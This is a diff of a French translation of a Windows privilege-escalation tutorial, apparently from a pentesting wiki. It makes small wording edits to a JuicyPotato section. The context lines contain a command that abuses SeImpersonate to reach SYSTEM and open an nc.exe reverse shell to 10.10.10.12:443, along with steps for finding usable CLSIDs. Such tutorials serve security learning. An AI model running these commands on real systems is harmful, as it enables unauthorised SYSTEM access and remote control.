@@ -73,9 +73,9 @@ Optional args:
 
 Si l'utilisateur a les privilèges `SeImpersonate` ou `SeAssignPrimaryToken`, alors vous êtes **SYSTEM**.
 
-Il est presque impossible d'empêcher l'abus de tous ces serveurs COM. Vous pourriez penser à modifier les permissions de ces objets via `DCOMCNFG`, mais bonne chance, cela va être difficile.
+Il est presque impossible d'empêcher l'abus de tous ces serveurs COM. Vous pourriez envisager de modifier les autorisations de ces objets via `DCOMCNFG`, mais bonne chance, cela va être difficile.
 
-La solution réelle est de protéger les comptes et applications sensibles qui fonctionnent sous les comptes `* SERVICE`. Arrêter `DCOM` inhiberait certainement cette exploitation, mais pourrait avoir un impact sérieux sur le système d'exploitation sous-jacent.
+La véritable solution est de protéger les comptes et applications sensibles qui fonctionnent sous les comptes `* SERVICE`. Arrêter `DCOM` inhiberait certainement cette exploitation, mais pourrait avoir un impact sérieux sur le système d'exploitation sous-jacent.
 
 De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
@@ -83,7 +83,7 @@ De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
 Remarque : Visitez [cette page](https://ohpe.it/juicy-potato/CLSID/) pour une liste de CLSIDs à essayer.
 
-### Obtenir un shell inversé nc.exe
+### Obtenir un shell inverse nc.exe
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -116,7 +116,7 @@ Tout d'abord, vous aurez besoin de quelques exécutables en plus de juicypotato.
 
 Téléchargez [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) et chargez-le dans votre session PS, puis téléchargez et exécutez [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ce script créera une liste de CLSIDs possibles à tester.
 
-Ensuite, téléchargez [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(changez le chemin vers la liste des CLSID et vers l'exécutable juicypotato) et exécutez-le. Il commencera à essayer chaque CLSID, et **lorsque le numéro de port change, cela signifiera que le CLSID a fonctionné**.
+Ensuite, téléchargez [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (changez le chemin vers la liste des CLSID et vers l'exécutable juicypotato) et exécutez-le. Il commencera à essayer chaque CLSID, et **lorsque le numéro de port change, cela signifiera que le CLSID a fonctionné**.
 
 **Vérifiez** les CLSIDs fonctionnels **en utilisant le paramètre -c**
 
